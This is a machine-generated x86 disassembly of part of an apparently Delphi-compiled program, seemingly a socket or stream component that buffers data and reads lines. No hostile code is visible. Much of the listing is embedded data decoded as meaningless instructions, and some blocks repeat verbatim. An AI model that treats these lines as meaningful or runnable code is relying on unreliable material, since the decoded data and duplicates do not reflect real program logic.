add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
sbb [ ebp + 0x49 ] al
dec esi
outsd
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
imul eax [ esi ] 0xc
add [ eax ] al
add ah ah
push 0x46
inc ebp
outsb
xor [ fs : ebx + 0x46 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
push edi
add bh bh
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b000d ] al
outsb
cmp al 0x46
add [ eax ] bh
add [ eax ] al
imul edi [ edx + 0x65 ] r-xdata
nop
add [ eax ] al
call [ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e000b ] al
outsb
inc esp
imul esi [ ebx + 0x63 ] 0x656e6e6f
arpl [ ebp + 0x64 ] si
pushad
inc edi
insd
inc esi
add [ ebx ] dh
ror [ ebx + 0x88bfc45 ] cl
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_466d5d
push [ fs : eax ]
mov [ fs : eax ] esp
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x30 ]
xor eax eax
push ebp
push sub_466d40
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404074
jmp r-xdata
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
cmovne ecx [ ecx + 0x64 ]
inc esi
imul ebp [ ebp + 0x4e ] 0x6f46746f
jne r-xdata
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp * 2 + 0xc0046 ] dh
add [ eax ] al
in al 0x6a
inc esi
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
outsd
outsb
outsb
arpl [ gs : ebp + 0x64 ] si
mov ah 0x6c
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
cmovne ecx [ ecx + 0x64 ]
dec esi
outsd
inc esp
popad
je r-xdata
outsb
outsd
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
outsd
push edx
popad
pop eax
insb
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x6c ] bl
push 0x61746144
dec ecx
outsb
inc edx
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_466f0c
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_40433c
call [ ecx + 0x38 ]
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466d47
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
inc esi
add [ eax + eax ] cl
add [ eax ] al
in al 0x6a
inc esi
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
cmovne ecx [ ecx + 0x64 ]
dec esi
outsd
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
insb
jb r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebp
jb r-xdata
imul eax [ esi ] 0xc
add [ eax ] al
add ah ah
push 0x46
add al ch
xor al 0x40
add ah dh
inc eax
add ah bh
imul eax [ esi ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
sub_466698
mov eax [ ebp - 0x4 ]
add eax 0x44
mov edx [ ebx + 0x4 ]
call sub_4040c8
call sub_403aa8
mov eax [ ebp - 0x4 ]
call sub_41a038
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4666bc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4666e1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4666e8
retn
sub_466a81
cmp [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or al 0x0
push es
dec edi
outsb
push edi
outsd
jb r-xdata
imul eax [ esi ] 0xc
add [ eax ] al
add al dh
inc ebp
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
adc eax 0x54644945
mov esp 0x4000463b
add [ eax ] al
inc [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax 0x6e4f0b00
push edi
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
outsd
jb r-xdata
inc ebx
push eax
inc ebx
outsd
outsb
outsb
inc eax
add [ edx + esi + 0x40 ] dl
add [ eax + 0x15004032 ] dl
inc ebp
dec ecx
push esp
inc edx
imul ebp [ gs : bp + 0x1c ] 0x4800463c
add [ eax ] al
dec [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
mov ah 0x6c
push esp
add [ eax - 0x80000000 ] al
push cs
add [ ecx ] cl
dec edi
outsb
push edi
outsd
jb r-xdata
rcl [ ebx + ebp * 2 + 0x46 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebp * 2 + 0xc0046 ] dl
add [ eax ] al
in al 0x6a
inc esi
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
sbb [ ebp + 0x49 ] al
dec esi
outsd
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
imul eax [ esi ] 0xc
add [ eax ] al
add ah ah
push 0x46
inc ebp
outsb
xor [ fs : ebx + 0x46 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
inc edi
insd
inc esi
add [ ebx ] dh
ror [ ebx + 0x88bfc45 ] cl
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_466d5d
push [ fs : eax ]
mov [ fs : eax ] esp
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x30 ]
xor eax eax
push ebp
push sub_466d40
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404074
jmp r-xdata
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
cmovne ecx [ ecx + 0x64 ]
inc esi
imul ebp [ ebp + 0x4e ] 0x6f46746f
jne r-xdata
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp * 2 + 0xc0046 ] dh
add [ eax ] al
in al 0x6a
inc esi
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
outsd
outsb
outsb
arpl [ gs : ebp + 0x64 ] si
mov ah 0x6c
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
cmovne ecx [ ecx + 0x64 ]
dec esi
outsd
inc esp
popad
je r-xdata
outsb
outsd
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
outsd
push edx
popad
pop eax
insb
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x6c ] bl
push 0x61746144
dec ecx
outsb
inc edx
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_466f0c
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_40433c
call [ ecx + 0x38 ]
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466d47
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
inc esi
add [ eax + eax ] cl
add [ eax ] al
in al 0x6a
inc esi
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
cmovne ecx [ ecx + 0x64 ]
dec esi
outsd
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
insb
jb r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebp
jb r-xdata
imul eax [ esi ] 0xc
add [ eax ] al
add ah ah
push 0x46
add al ch
xor al 0x40
add ah dh
inc eax
add ah bh
imul eax [ esi ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
sub_466d6c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1 ] cl
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_466e30
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
cmp [ edi + 0x69 ] 0x0
jne r-xdata
mov esi [ edi + 0x7c ]
test esi esi
je r-xdata
cmp [ edi + 0x7c ] 0x0
jne r-xdata
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x48 ]
test al al
je r-xdata
mov esi [ edi + 0x7c ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466e37
lea eax [ ebp - 0x8 ]
call sub_404074
retn
mov eax [ edi + 0x74 ]
mov edx [ eax ]
call [ edx ]
cmp edx 0x0
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x5c ]
mov dl 0x4
mov eax edi
call sub_463eb8
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x48 ]
xor al 0x1
sete al
or al [ ebp - 0x1 ]
je r-xdata
cmp eax 0x0
test bl bl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
sub_466e40
push ebx
push esi
mov ebx eax
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x48 ]
mov edx [ ebx + 0x7c ]
test edx edx
setne al
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x48 ]
sub_466e68
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_463da0
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46502c
mov [ esi + 0x6c ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46502c
mov [ esi + 0x80 ] eax
push 0x0
push 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_467d9c
mov [ esi + 0xa4 ] eax
mov [ esi + 0xa0 ] 0x8000
mov [ esi + 0xa8 ] 0x8000
push esi
push r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_468108
mov [ esi + 0x74 ] eax
mov [ esi + 0x88 ] 0x4000
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_466f0c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_404074
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov edi [ ebx + 0x74 ]
mov eax edi
mov edx [ eax ]
call [ edx ]
mov edx eax
mov ecx esi
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x20 ]
pop edi
pop esi
pop ebx
retn
push 0x1
or ecx 0xffffffff
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x6c ]
sub_466f4c
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x5c ]
cmp [ esi + 0x70 ] 0x0
je r-xdata
lea eax [ esi + 0x74 ]
call sub_40d01c
lea eax [ esi + 0xa4 ]
call sub_40d01c
lea eax [ esi + 0x80 ]
call sub_40d01c
lea eax [ esi + 0x6c ]
call sub_40d01c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_463e38
test bl bl
jle r-xdata
lea eax [ esi + 0x7c ]
call sub_40d01c
mov [ esi + 0x70 ] 0x0
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_466fb0
push ebx
mov ebx eax
mov dl 0x3
mov eax ebx
call sub_463eb8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x5c ]
cmp [ ebx + 0x70 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov dl 0x4
mov eax ebx
call sub_463eb8
pop ebx
retn
lea eax [ ebx + 0x7c ]
call sub_40d01c
mov [ ebx + 0x70 ] 0x0
sub_467008
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_467fa8
push edi
mov ecx esi
mov eax [ ebx + 0x80 ]
mov dx [ eax + 0xc ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x50 ]
pop edi
pop esi
pop ebx
retn
sub_467030
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_467081
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x80 ]
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax esi
call sub_40b63c
call sub_403a2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467088
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_467090
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_4670e6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov esi [ ebx + 0x80 ]
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ esi + 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_45ff64
call sub_403a2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4670ed
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_4670f4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_46738c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0xffffffff
jne r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
xor ecx ecx
mov dl [ ebp - 0x1 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x48 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ ebx + 0x9c ]
test eax eax
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor esi esi
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] 0xfffffffe
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467393
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_404098
lea eax [ ebp - 0x10 ]
call sub_404074
retn
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov ecx [ ebx + 0xa4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0xc ] 0xffffffff
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
xor esi esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp [ ebx + 0x7c ] 0x0
je r-xdata
test esi esi
sete al
mov [ ebx + 0x69 ] al
test al al
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
mov eax [ ebx + 0xa0 ]
cdq
push edx
push eax
mov eax ecx
call sub_415f00
mov esi [ ebx + 0xa4 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax [ ebx + 0x7c ]
mov esi [ eax ]
call [ esi + 0x54 ]
mov esi eax
jmp r-xdata
xor ecx ecx
mov dl [ ebp - 0x1 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x48 ]
mov [ ebp - 0xc ] esi
jmp r-xdata
push 0x1
mov [ ebp - 0x18 ] 0x274a
mov [ ebp - 0x14 ] 0x2745
lea ecx [ ebp - 0x18 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_4616d4
test al al
je r-xdata
test esi esi
jne r-xdata
test esi esi
jle r-xdata
xor esi esi
cmp [ ebx + 0x7c ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov eax esi
cdq
push edx
push eax
mov eax [ ebx + 0xa4 ]
call sub_415f00
cmp [ ebx + 0x78 ] 0x0
je r-xdata
mov eax [ ebx + 0x74 ]
mov edx [ eax ]
call [ edx ]
cmp edx 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x5c ]
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x7c ]
mov ecx [ eax ]
call [ ecx + 0x50 ]
test al al
je r-xdata
jmp r-xdata
cmp [ ebx + 0x68 ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0xa4 ]
call sub_415e9c
mov edx [ ebx + 0xa4 ]
mov eax [ ebx + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov eax [ ebx + 0xa4 ]
mov edx [ eax ]
call [ edx ]
mov esi eax
cmp eax 0x0
jne r-xdata
mov cx 0x2
xor edx edx
mov eax [ ebx + 0x74 ]
mov edi [ eax ]
call [ edi + 0x14 ]
mov edi [ ebx + 0xa4 ]
mov eax edi
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ edi + 0x4 ]
mov eax [ ebx + 0x74 ]
call sub_4160e0
mov eax [ ebx + 0xa4 ]
mov edx [ eax ]
call [ edx ]
mov edx eax
test edx edx
jle r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_461788
mov eax 0x1
mov ecx [ ebx + 0xa4 ]
mov ecx [ ecx + 0x4 ]
mov cl [ ecx + eax ]
and cl 0x7f
push ecx
mov ecx [ ebx + 0xa4 ]
mov ecx [ ecx + 0x4 ]
lea edi [ ecx + eax ]
pop ecx
mov [ edi ] cl
inc eax
dec edx
jne r-xdata
sub_4673a0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_404524
xor eax eax
push ebp
push sub_4675be
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_404334
test eax eax
jne r-xdata
mov eax [ esi + 0x88 ]
mov [ ebp + 0xc ] eax
mov [ esi + 0x98 ] 0x0
mov [ esi + 0x99 ] 0x0
xor ebx ebx
xor eax eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40410c
mov eax ebx
dec eax
cmp eax [ ebp + 0xc ]
jle r-xdata
mov eax [ esi + 0x74 ]
call sub_4681ec
mov edx eax
add edx [ ebp - 0xc ]
mov ecx edi
sub ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_46343c
mov ebx eax
test ebx ebx
jle r-xdata
test ebx ebx
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov [ ebp - 0xc ] edi
add ebx [ ebp - 0xc ]
test ebx ebx
jle r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0xc ]
jle r-xdata
cmp [ esi + 0x84 ] 0x0
jne r-xdata
mov eax [ esi + 0x74 ]
mov edx [ eax ]
call [ edx ]
mov edi eax
test edi edi
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_404334
mov edx eax
add edx ebx
dec edx
mov ecx [ ebp + 0x8 ]
mov eax [ esi + 0x74 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_404334
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404334
sub ebx eax
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404480
jne r-xdata
mov cl 0x1
mov dl 0x1
mov eax esi
mov edi [ eax ]
call [ edi + 0x48 ]
cmp [ ebp - 0x8 ] 0xffffffff
sete al
push eax
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax esi
mov edi [ eax ]
call [ edi + 0x6c ]
test eax eax
sete al
mov [ esi + 0x99 ] al
cmp [ esi + 0x99 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov [ esi + 0x98 ] 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax [ esi + 0x74 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx ebx
call sub_4046c0
test ebx ebx
jle r-xdata
mov eax [ ebp + 0x8 ]
call sub_404074
jmp r-xdata
cmp [ esi + 0x84 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4675c5
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_404098
lea eax [ ebp - 0x4 ]
call sub_404074
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax + ebx - 0x1 ] 0xd
jne r-xdata
mov [ esi + 0x98 ] 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax [ esi + 0x74 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
jmp r-xdata
mov edx ebx
dec edx
mov eax [ ebp + 0x8 ]
call sub_4046c0
jmp r-xdata
sub_4675dc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_467652
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404074
xor esi esi
jmp r-xdata
mov eax [ ebx ]
call sub_404334
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467659
lea eax [ ebp - 0xc ]
call sub_404074
retn
cmp esi [ ebp - 0x8 ]
jl r-xdata
inc esi
push 0xffffffff
lea eax [ ebp - 0xc ]
push eax
or ecx 0xffffffff
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x70 ]
mov eax [ ebp - 0xc ]
mov edx ebx
call sub_407f4c
sub_467663
inc [ ecx ]
add [ eax ] al
add [ edx ] cl
add [ eax ] al
add [ ebx - 0x75 ] dl
fmul [ ebx + 0x7de87443 ]
or al [ eax ]
add dh al
inc ebx
imul eax [ eax ] 0x408dc35b
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
mov esi ecx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x7c ]
mov edx esi
mov ecx [ ebp + 0x8 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x60 ]
pop esi
pop ebx
pop ebp
retn 0x4
sub_4676a4
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_41a400
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x78 ]
jne r-xdata
cmp esi [ edi + 0x7c ]
jne r-xdata
xor eax eax
mov [ edi + 0x78 ] eax
xor eax eax
mov [ edi + 0x7c ] eax
sub_4676ec
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x7c ] 0x0
je r-xdata
test esi esi
jne r-xdata
cmp [ ebx + 0x70 ] 0x0
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
xor eax eax
mov [ ebx + 0xac ] eax
jmp r-xdata
lea eax [ ebx + 0x7c ]
call sub_40d01c
mov [ ebx + 0x70 ] 0x0
mov eax esi
mov [ ebx + 0x7c ] eax
test eax eax
je r-xdata
mov [ ebx + 0xac ] esi
pop esi
pop ebx
retn
mov edx ebx
call sub_41a1b4
sub_467744
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_404334
test eax eax
jle r-xdata
pop esi
pop ebx
retn
push 0x0
mov edx esi
mov ecx eax
mov eax ebx
call sub_467768
sub_467768
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
